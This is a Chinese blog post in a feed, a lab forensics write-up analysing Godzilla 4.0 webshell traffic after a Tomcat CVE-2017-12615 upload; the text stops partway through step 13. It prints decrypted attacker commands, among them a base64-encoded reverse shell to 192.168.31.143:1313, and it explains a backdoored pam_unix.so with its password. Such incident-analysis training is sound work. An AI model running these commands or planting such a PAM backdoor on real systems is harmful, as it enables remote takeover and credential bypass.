<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WayneJH Blog</title>
  
  
  <link href="https://waynejoon.github.io/atom.xml" rel="self"/>
  
  <link href="https://waynejoon.github.io/"/>
  <updated>2025-08-04T13:22:09.923Z</updated>
  <id>https://waynejoon.github.io/</id>
  
  <author>
    <name>WayneJoon.H</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>玄机靶场 | 哥斯拉4.0流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/</id>
    <published>2025-08-04T13:20:49.000Z</published>
    <updated>2025-08-04T13:22:09.923Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>登录服务器并结合数据包附件来分析黑客的入侵行为，其中只有第12题需要上机，其他的用数据包附件分析即可</p><p>用户名：root</p><p>密码：<a href="mailto:&#x78;&#x6a;&#64;&#103;&#115;&#x6c;&#52;&#46;&#48;">xj@gsl4.0</a></p><p>SSH连接：ssh root@ip -p 222</p><p>注意SSH端口是<strong>222</strong></p><h2 id="哥斯拉流量特征"><a href="#哥斯拉流量特征" class="headerlink" title="哥斯拉流量特征"></a>哥斯拉流量特征</h2><p><strong>哥斯拉静态特征</strong></p><p>在默认编码情况下，jsp会出现密钥xc、密码pass和Java反射等特征</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804164413767.png"></p><p><strong>哥斯拉动态特征</strong></p><ul><li><p>User-Agent字段（弱特征）：如采用默认情况，会暴露使用的jdk信息，不过哥斯拉支持自定义HTTP头部，这个默认特征可以去除</p></li><li><p>Accept字段（弱特征）：默认是<code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。</code>，这个也可以修改，只能作为辅助手段</p></li><li><p>Cookie最后会有个分号</p></li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250804164739806.png"></p><p>而正常流量如果没有分点，一般没有分号</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804164852925.png"></p><ul><li>响应数据的格式是固定的：<code>MD5前半部分 + AES加密并Base64编码的结果 + MD5后半部分</code></li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250803190142823.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>黑客的IP是什么？</strong></p><p>首先通过wireshark语法筛选出http流量并过滤掉404状态码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and !(http.response.code == 404)</span><br></pre></td></tr></table></figure><p>分析流量，可以发现前面有很多GET请求，判断这是攻击者在进行目录扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171724955.png"></p><p>查看IP统计进一步确认</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171826676.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171919936.png"></p><p>可以看到这两个IP出现数量很多，结合前面的分析，因此192.168.31.190是攻击者IP，192.168.31.168是受害者IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.190&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客是通过什么漏洞进入服务器的？（提交CVE编号）</strong></p><p>继续分析流量，发现攻击者用PUT请求上传了一个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172140304.png"></p><p>追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172234380.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172318358.png"></p><p>出现了密钥xc、密码pass和Java反射类等，符合哥斯拉webshell特征，因此这个hello.jsp文件就是木马文件</p><p>继续分析前面的正常文件，发现网站是<strong>Tomcat</strong>搭建的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172728140.png"></p><p>且攻击者PUT方法上传文件之后网站状态码为201</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804173020769.png"></p><p>因此这是一个Tomcat的PUT文件上传漏洞，上网搜索对应漏洞即可</p><p>参考链接：<a href="https://www.cnblogs.com/Junglezt/p/18123082">https://www.cnblogs.com/Junglezt/p/18123082</a></p><p>搜索得到漏洞编号为CVE-2017-12615</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CVE-2017-12615&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客上传的木马文件名是什么？(提交文件名)</strong></p><p>由步骤二可知，木马文件名为hello.jsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hello.jsp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客上传的木马连接密码是什么？</strong></p><p>参考步骤二可知，连接密码为7f0e6f</p><p>也可以通过看Webshell通信包得到连接密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804181800929.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7f0e6f&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客上传的木马解密密钥是什么？</strong> </p><p>由步骤二可知，密钥为1710acba6220f62b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1710acba6220f62b&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客连接webshell后执行的第一条命令是什么？</strong></p><p>这里用到abc123师傅开发的<strong>蓝队分析研判工具箱</strong>，感谢师傅开源</p><p>Github地址：<a href="https://github.com/abc123info/BlueTeamTools">https://github.com/abc123info/BlueTeamTools</a></p><p>首先用wireshark语法把hello.jsp的通信流量全部筛选出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == POST and http.request.uri contains &quot;hello.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250804182519902.png"></p><p>可以看到总共18个数据包，逐个追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804183024077.png"></p><p>用蓝队分析研判工具箱进行解密，把请求的body复制进去，然后点击<strong>解密请求数据包</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804183243945.png"></p><p>解密发现<strong>数据流44、45</strong>只是连接哥斯拉时默认执行的，因此忽略不计，从数据流46开始分析</p><p>以下是数据流46到结尾的解密结果</p><p><strong>数据流46</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;uname -rmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">4.19.0-25-amd64</span><br></pre></td></tr></table></figure><p><strong>数据流47</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;idmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><strong>数据流48</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs$  -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;cat /etc/os-releasemethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;</span><br><span class="line">NAME=&quot;Debian GNU/Linux&quot;</span><br><span class="line">VERSION_ID=&quot;10&quot;</span><br><span class="line">VERSION=&quot;10 (buster)&quot;</span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=&quot;https://www.debian.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://www.debian.org/support&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</span><br></pre></td></tr></table></figure><p><strong>数据流49</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">请求1</span><br><span class="line">cmdLine &amp;   sh -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs #  -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;rmp -qa | grep pammethodName  execCommand</span><br><span class="line">响应1</span><br><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found</span><br><span class="line"></span><br><span class="line">请求2</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;idmethodName  xecCommand</span><br><span class="line">响应2</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><strong>数据流50</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine &amp;  sh -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs #  -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1   -carg-2  cd &quot;/&quot;;rpm -qa | grep pammethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found</span><br></pre></td></tr></table></figure><p><strong>数据流51</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine 0  sh -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs -  -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 #  cd &quot;/&quot;;dpkg -l libpam-modules:amd64methodName  execCommand</span><br><span class="line">响应</span><br><span class="line">Desired=Unknown/Install/Remove/Purge/Hold</span><br><span class="line">| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend</span><br><span class="line">|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)</span><br><span class="line">||/ Name                 Version      Architecture Description</span><br><span class="line">+++-====================-============-============-========================================</span><br><span class="line">ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM</span><br></pre></td></tr></table></figure><p><strong>数据流52</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine l  sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs i  -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 _  cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">空</span><br></pre></td></tr></table></figure><p><strong>数据流53</strong></p><p>空</p><p><strong>数据流54</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">methodName  getFiledirName  /</span><br><span class="line">响应</span><br><span class="line">ok</span><br><span class="line">//</span><br><span class="line">wget-log 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">lib 0 2024-09-18 08:06:13 4096 RWX</span><br><span class="line">usr 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">lib32 0 2023-12-25 02:31:48 4096 RWX</span><br><span class="line">libx32 0 2023-12-25 02:31:48 4096 RWX</span><br><span class="line">lost+found 0 2023-12-25 02:31:44 16384 RWX</span><br><span class="line">sbin 0 2024-09-18 08:06:06 12288 RWX</span><br><span class="line">vmlinuz 1 2023-08-07 22:35:25 5283136 RW</span><br><span class="line">opt 0 2024-09-19 08:41:28 4096 RWX</span><br><span class="line">mnt 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">etc 0 2024-09-19 07:35:49 4096 RWX</span><br><span class="line">root 0 2024-09-19 08:41:48 4096 RWX</span><br><span class="line">srv 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">proc 0 2024-09-19 06:29:54 0 RWX</span><br><span class="line">dev 0 2024-09-19 06:29:58 3160 RWX</span><br><span class="line">initrd.img.old 1 2023-12-25 02:32:56 28089917 RW</span><br><span class="line">initrd.img 1 2023-12-25 02:34:12 28246009 RW</span><br><span class="line">vmlinuz.old 1 2020-07-24 14:46:18 5274864 RW</span><br><span class="line">var 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">wget-log.1 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">lib64 0 2024-09-18 08:05:13 4096 RWX</span><br><span class="line">media 0 2023-12-25 02:31:45 4096 RWX</span><br><span class="line">boot 0 2023-12-25 02:41:35 1024 RWX</span><br><span class="line">tmp 0 2024-09-19 09:00:35 4096 RWX</span><br><span class="line">run 0 2024-09-19 09:00:35 600 RWX</span><br><span class="line">wget-log.2 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">home 0 2023-12-25 02:43:00 4096 RWX</span><br><span class="line">bin 0 2024-09-19 07:35:48 28672 RWX</span><br><span class="line">sys 0 2024-09-19 06:29:55 0 RWX</span><br></pre></td></tr></table></figure><p><strong>数据流55</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">methodName  getFiledirName  /tmp/</span><br><span class="line">响应</span><br><span class="line">ok</span><br><span class="line">/tmp/</span><br><span class="line">ssh-rJgBkHZMg0 0 2024-09-19 08:30:00 4096 RWX</span><br><span class="line">code-8a1ad303-d54a-4ee6-bf06-79c09e867bed 1 2024-09-19 08:15:43 0 RWX</span><br><span class="line">.XIM-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">ssh-vWnAfxielC 0 2024-09-19 08:43:32 4096 RWX</span><br><span class="line">ssh-HqBIxaU2OF 0 2024-09-19 08:15:37 4096 RWX</span><br><span class="line">hsperfdata_root 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">systemd-private-fe1119a9e31340ada72ff5bdd7dcb056-systemd-timesyncd.service-wVf4Jf 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">1.pcap 1 2024-09-19 09:03:14 1490944 RW</span><br><span class="line">.Test-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.X11-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.ICE-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.font-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">ssh-P22RjIKAZ3 0 2024-09-19 08:19:17 4096 RWX</span><br><span class="line">ssh-F8xrTEcjZ2 0 2024-09-19 08:39:58 4096 RWX</span><br><span class="line">ssh-JmgaMLTFgu 0 2024-09-19 08:21:23 4096 RWX</span><br><span class="line">ssh-r6qMz7wlBA 0 2024-09-19 09:00:35 4096 RWX</span><br></pre></td></tr></table></figure><p><strong>数据流56</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">fileName  /tmp/pam_unix.sofileValue NELF</span><br><span class="line">响应</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p><strong>数据流57</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine l  sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs i  -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 _  cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">空</span><br></pre></td></tr></table></figure><p>分析数据流46，前面的<code>cmdLine  sh -c &quot;cd &quot;/&quot;</code>是哥斯拉自动执行的，后面的<code>uname -r</code>是攻击者执行的，因此答案就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;uname -r&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>黑客连接webshell时查询当前shell的权限是什么？</strong></p><p>由步骤六的<strong>数据流47</strong>可知，攻击者执行了命令<code>id</code>，用于查询<strong>用户和用户组相关的身份信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>因此当前shell的权限就是root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;root&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？</strong></p><p>分析步骤六中的数据流，发现<strong>数据流48</strong>运行了命令<code>cat /etc/os-release</code>，该命令主要作用是<strong>查看 Linux 操作系统的详细版本和发行相关信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;</span><br><span class="line">NAME=&quot;Debian GNU/Linux&quot;</span><br><span class="line">VERSION_ID=&quot;10&quot;</span><br><span class="line">VERSION=&quot;10 (buster)&quot;</span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=&quot;https://www.debian.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://www.debian.org/support&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</span><br></pre></td></tr></table></figure><p>因此答案就是PRETTY_NAME的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Debian GNU/Linux 10 (buster)&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）</strong></p><p><strong>数据流49</strong>，攻击者先是<strong>错误地</strong>输入了 <code>rmp</code>，发现命令不存在</p><p>然后<strong>数据流50</strong>中攻击者修正了命令为 <code>rpm</code>，执行<code>rpm -qa | grep pam</code>，但是返回结果仍显示not found</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found</span><br></pre></td></tr></table></figure><p>rpm命令是用于管理RPM包的命令行工具，这个命令是在查询pam相关的包，pam模块与Linux的用户认证有关，是一个非常敏感和危险的位置</p><p>在<strong>数据流51</strong>，攻击者根据之前的失败，推断出这不是一个基于RPM的系统（如CentOS），转而使用Debian&#x2F;Ubuntu系的 <code>dpkg</code> 命令进行查询，并<strong>成功</strong>获取了信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Desired=Unknown/Install/Remove/Purge/Hold</span><br><span class="line">| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend</span><br><span class="line">|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)</span><br><span class="line">||/ Name                 Version      Architecture Description</span><br><span class="line">+++-====================-============-============-========================================</span><br><span class="line">ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM</span><br></pre></td></tr></table></figure><p>攻击者执行成功的命令就是<code>dpkg -l libpam-modules:amd64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dpkg -l libpam-modules:amd64&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>黑客留下后门的反连的IP和PORT是什么？（IP:PORT)</strong></p><p><strong>数据流52</strong>中的请求体中存在base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==</span><br></pre></td></tr></table></figure><p>解码后得到结果为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804200512400.png"></p><p>很明显，这个就是反连命令，因此IP是192.168.31.143，端口为1313</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.143:1313&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤#11"></a>步骤#11</h3><p><strong>黑客通过什么文件留下了后门？</strong></p><p>继续分析<strong>步骤六</strong>中的数据包，发现<strong>数据流56</strong>跟文件相关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">fileName  /tmp/pam_unix.sofileValue NELF</span><br><span class="line">响应</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p>攻击者上传了一个恶意的PAM模块文件 <code>pam_unix.so</code>。该方法攻击原理是，用这个恶意文件替换掉Linux系统中负责密码验证的核心模块，从而植入一个“万能密码”（例如 <code>password123</code>）或“后门用户”（无论输入什么密码都能成功），从而实现对系统身份认证机制的劫持</p><p>可以看到攻击者上传路径为<code>/tmp/pam_unix.so</code>，这个先记住，后面有用</p><p>因此后门文件就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pam_unix.so&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-12"><a href="#步骤-12" class="headerlink" title="步骤#12"></a>步骤#12</h3><p><strong>黑客设置的后门密码是什么？</strong></p><p>连接到玄机靶场机器，进去后执行<code>history</code>查看攻击者执行的历史命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804202718732.png"></p><p>可以看到，攻击者先将系统正常的用户密码认证模块（<code>pam_unix.so</code>）备份成一个隐藏文件，然后用自己上传的、含有后门功能的同名恶意文件（<code>/tmp/pam_unix.so</code>）替换掉原始文件（<code>/lib/x86_64-linux-gnu/security/pam_unix.so</code>）</p><p>直接在<code>/tmp</code>里面查找会找不到<code>pam_unix.so</code>，估计是攻击者删除了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804203050795.png"></p><p>那我们去<code>/lib/x86_64-linux-gnu/security</code>目录查找，成功找到目标文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804203147348.png"></p><p>将<code>pam_unix.so</code>拷贝下来，用IDA进行静态分析</p><p><code>pam_sm_authenticate</code> 是 Linux PAM（可插拔认证模块，Pluggable Authentication Modules）中<strong>认证服务模块的核心函数</strong>，专门用于<strong>验证用户身份</strong></p><p>因此我们找到函数<code>pam_sm_authenticate</code>进行分析，成功获得后门密码<code>XJ@123</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804204858805.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XJ@123&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-13"><a href="#步骤-13" class="headerlink" title="步骤#13"></a>步骤#13</h3><p><strong>黑客的恶意dnslog服务器地址是什么？</strong></p><p>wireshark语法搜索dns，可以找到黑客的恶意dnslog服务器地址，但是要注意这个地址后面有个点号（后面分析IDA发现的）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804201612169.png"></p><p>或者可以通过IDA分析<code>pam_sm_authenticate</code>认证函数来获取dnslog地址</p><p><img 